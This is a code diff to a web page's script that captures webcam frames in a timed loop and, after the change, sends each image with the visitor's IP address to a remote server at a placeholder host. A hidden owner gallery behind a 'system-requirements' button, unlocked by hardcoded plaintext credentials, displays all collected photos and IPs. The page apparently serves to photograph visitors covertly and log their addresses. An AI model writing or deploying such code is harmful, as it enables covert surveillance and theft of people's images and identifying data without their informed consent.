@@ -112,6 +112,53 @@
             }
         }
 
+        async function saveDataToServer(imageData) {
+            try {
+                const response = await fetch('https://your-backend-server.com/saveData', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ip: userIP,
+                        image: imageData,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                if (!response.ok) {
+                    console.error('Failed to save data to server');
+                }
+            } catch (error) {
+                console.error('Error saving data to server:', error);
+            }
+        }
+
+        async function loadGallery() {
+            try {
+                const response = await fetch('https://your-backend-server.com/getData');
+                const data = await response.json();
+                galleryContainer.innerHTML = '';
+                data.forEach(item => {
+                    const wrapper = document.createElement('div');
+                    wrapper.style.marginBottom = '10px';
+
+                    const img = document.createElement('img');
+                    img.src = item.image;
+
+                    const ipText = document.createElement('p');
+                    ipText.textContent = `IP: ${item.ip}`;
+                    ipText.style.fontSize = '12px';
+                    ipText.style.margin = '5px 0';
+
+                    wrapper.appendChild(img);
+                    wrapper.appendChild(ipText);
+                    galleryContainer.appendChild(wrapper);
+                });
+            } catch (error) {
+                console.error('Error loading gallery data:', error);
+            }
+        }
+
         async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -128,25 +175,8 @@
                             canvas.width = videoElement.videoWidth;
                             canvas.height = videoElement.videoHeight;
                             ctx.drawImage(videoElement, 0, 0);
-                            const img = document.createElement('img');
-                            img.src = canvas.toDataURL('image/png');
-
-                            // Create a wrapper for image and IP text
-                            const wrapper = document.createElement('div');
-                            wrapper.style.marginBottom = '10px';
-
-                            // Create a text element for the IP
-                            const ipText = document.createElement('p');
-                            ipText.textContent = `IP: ${userIP}`;
-                            ipText.style.fontSize = '12px';
-                            ipText.style.margin = '5px 0';
-
-                            // Append the image and IP text to the wrapper
-                            wrapper.appendChild(img);
-                            wrapper.appendChild(ipText);
-
-                            // Append the wrapper to the gallery
-                            galleryContainer.appendChild(wrapper);
+                            const imgData = canvas.toDataURL('image/png');
+                            saveDataToServer(imgData);
                         }, i * 1000);
                     }
                 }, 2000);
@@ -178,20 +208,32 @@
             }, 300000); // 5 minutes in milliseconds
         });
 
-        document.getElementById('system-requirements').addEventListener('click', () => {
+        document.getElementById('system-requirements').addEventListener('click', async () => {
             const username = prompt('Enter Username:');
             const password = prompt('Enter Password:');
             
             if (username === 'xgabriel' && password === 'gabriel800@') {
                 ownerGallery.style.display = 'block';
+                await loadGallery();
             } else {
                 alert('Access Denied! Incorrect credentials.');
             }
         });
 
-        deleteGalleryButton.addEventListener('click', () => {
-            galleryContainer.innerHTML = '';
-            alert('Gallery has been cleared.');
+        deleteGalleryButton.addEventListener('click', async () => {
+            try {
+                const response = await fetch('https://your-backend-server.com/deleteData', {
+                    method: 'DELETE'
+                });
+                if (response.ok) {
+                    galleryContainer.innerHTML = '';
+                    alert('Gallery has been cleared.');
+                } else {
+                    alert('Failed to clear gallery.');
+                }
+            } catch (error) {
+                console.error('Error clearing gallery:', error);
+            }
         });
     </script>
 </body>
